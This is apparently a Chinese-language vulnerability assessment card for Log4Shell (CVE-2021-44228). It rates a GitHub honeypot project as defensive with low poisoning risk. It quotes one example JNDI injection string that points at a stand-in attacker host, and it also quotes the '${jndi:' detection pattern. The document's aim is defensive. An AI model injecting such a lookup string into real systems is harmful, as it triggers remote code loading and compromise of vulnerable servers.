## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)